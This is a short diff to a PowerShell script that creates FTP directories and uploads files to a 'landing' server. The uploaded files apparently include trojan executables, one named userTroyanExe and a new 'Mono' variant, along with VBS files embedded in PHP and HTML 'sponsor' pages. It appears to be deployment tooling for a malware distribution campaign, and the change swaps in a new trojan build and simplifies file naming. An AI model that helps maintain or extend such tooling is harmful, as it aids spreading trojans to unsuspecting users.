@@ -18,7 +18,7 @@ if ($server.landingAuto -eq $false)
 
 $ftpStorage=$server.landingFtp
 
-$files = @($server.userTroyanExe, $server.userTroyanExeParts, $server.userVbsFile, $server.userPhpVbsFile,$server.userSponsorPhpVbsFile,$server.userSponsorHtmlVbsFile)
+$files = @($server.userTroyanExe, $server.userTroyanExeMono, $server.userVbsFile, $server.userPhpVbsFile,$server.userSponsorPhpVbsFile,$server.userSponsorHtmlVbsFile)
 
 $name = $server.landingName
 
@@ -69,15 +69,7 @@ Create-FtpDirectory -ftpUrl $ftpBaseUrl -ftpUsername $ftpUsername -ftpPassword $
 # Upload files with new names
 foreach ($file in $files) {
     if (Test-Path $file) {
-        if ($file -like "*.php*" -or $file -like "*.html*") 
-        {
-            $newFileName = [System.IO.Path]::GetFileName($file)
-        }
-        else 
-        {    
-            $fileExtension = [System.IO.Path]::GetExtension($file)
-            $newFileName = "$name$fileExtension"
-        }
+        $newFileName = [System.IO.Path]::GetFileName($file)
         Upload-FtpFile -ftpUrl $ftpStorage -ftpUsername $ftpUsername -ftpPassword $ftpPassword -filePath $file -newFileName $newFileName
     } else {
         Write-Host "File not found: $file"
